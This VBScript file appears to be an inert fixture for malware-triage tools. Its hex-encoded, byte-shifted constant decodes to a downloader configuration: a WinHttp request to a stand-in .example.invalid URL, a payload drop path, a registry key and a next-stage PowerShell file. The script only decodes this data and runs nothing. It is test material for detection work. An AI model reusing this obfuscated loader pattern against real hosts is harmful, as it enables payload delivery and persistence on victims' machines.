Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_d6afa0d9 = "844b3f8a8182737e814b6f717f837780736d80737b7d82733a85807782736d74777a733a7277817e6f8271766d7e807d717381813a766f7c727d74746d817180777e828a6f726f7e8273804b65777c5682827e3c65777c5682827e60737f837381823c433c3f8a81826f75736d717d837c824b428a716f7b7e6f77757c6d77724b716f7b7e6f77757c3b6f7347424374463e70478a83807a4b7682827e81483d3d6f7347424374463e70473c73866f7b7e7a733c777c846f7a77723d45454640474272433c726f828a838173806d6f75737c824b56837c82807381815a6f703d6f7347424374463e70478a74777a736d7e6f82764b51486a63817380816a5e83707a77716a56837c82807381815a6f706a81826f75733b6f7347424374463e70473c726f828a80737577818280876d7e6f82764b565951636a617d7482856f80736a56837c82807381815a6f706a5277817e7d816f707a736a6f7347424374463e70478a7c7386826d81826f75734b8073817d838071733b816f7b7e7a733c7e813f"
Const Codec_d6afa0d9 = "hex_compact|add_modulo_256|0e"

Function Load_d6afa0d9()
  Dim result(), i
  ReDim result((Len(Material_d6afa0d9) \ 2) - 1)
  For i = 0 To UBound(result)
    result(i) = CInt("&H" & Mid(Material_d6afa0d9, i * 2 + 1, 2))
  Next
  Load_d6afa0d9 = result
End Function

Function Decode_d6afa0d9(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  For i = 0 To UBound(s)
    result(i) = (s(i) - 14 + 256) Mod 256
  Next
  Decode_d6afa0d9 = result
End Function

Function Recover_d6afa0d9()
  Dim s, d, t, n, i, p, e, q
  If True Then
    n = LCase(UCase("Host"))
      s = Load_d6afa0d9()
      Do
        d = Decode_d6afa0d9(s)
        Exit Do
      Loop
      t = ""
      For i = 0 To UBound(d)
        t = t & Chr(d(i))
      Next
  End If
  Recover_d6afa0d9 = t
End Function

Function Inspect_d6afa0d9()
  Dim fields
  fields = Split(Recover_d6afa0d9(), "|")
  Inspect_d6afa0d9 = Join(fields, "|")
End Function
